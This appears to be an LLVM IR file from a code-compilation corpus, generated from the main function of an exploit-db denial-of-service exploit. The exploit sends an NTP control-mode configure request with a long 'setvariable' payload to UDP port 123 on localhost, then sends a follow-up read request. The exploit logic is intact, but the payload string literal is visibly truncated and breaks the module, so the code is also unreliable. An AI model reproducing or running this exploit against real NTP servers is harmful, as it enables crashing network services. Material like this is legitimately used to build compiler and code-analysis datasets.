; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_39445.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_39445.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }

@PF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@sockfd = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@serverAddr = common dso_local global %struct.TYPE_4__ zeroinitializer, align 4
@.str = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@addr_size = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [952 x i8] c"setvaralign 1
@CTL_OP_CONFIGURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@CTL_OP_READVAR = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [1024 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %16 = load i32, i32* @PF_INET, align 4
  %17 = load i32, i32* @SOCK_DGRAM, align 4
  %18 = call i32 @socket(i32 %16, i32 %17, i32 0)
  store i32 %18, i32* @sockfd, align 4
  %19 = load i32, i32* @AF_INET, align 4
  store i32 %19, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @serverAddr, i32 0, i32 3), align 4
  %20 = call i32 @htons(i32 123)
  store i32 %20, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @serverAddr, i32 0, i32 2), align 4
  %21 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  store i32 %21, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @serverAddr, i32 0, i32 1, i32 0), align 4
  %22 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @serverAddr, i32 0, i32 0), align 4
  %23 = call i32 @memset(i32 %22, i8 signext 0, i32 4)
  store i32 16, i32* @addr_size, align 4
  store i8* getelementptr inbounds ([952 x i8], [952 x i8]* @.str.1, i64 0, i64 0), i8** %5, align 8
  %24 = load i32, i32* @CTL_OP_CONFIGURE, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = call i32 @strlen(i8* %25)
  %27 = load i8*, i8** %5, align 8
  %28 = call i32 @sendrequest(i32 %24, i32 0, i32 1, i32 %26, i8* %27, i32* %6, i32* %7, i8** %8)
  store i32 %28, i32* %10, align 4
  %29 = call i32 @sleep(i32 5)
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i8** %5, align 8
  %30 = load i32, i32* @CTL_OP_READVAR, align 4
  %31 = load i8*, i8** %5, align 8
  %32 = call i32 @strlen(i8* %31)
  %33 = load i8*, i8** %5, align 8
  %34 = call i32 @sendrequest(i32 %30, i32 0, i32 1, i32 %32, i8* %33, i32* %6, i32* %7, i8** %8)
  store i32 %34, i32* %10, align 4
  ret i32 0
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @memset(i32, i8 signext, i32) #1

declare dso_local i32 @sendrequest(i32, i32, i32, i32, i8*, i32*, i32*, i8**) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
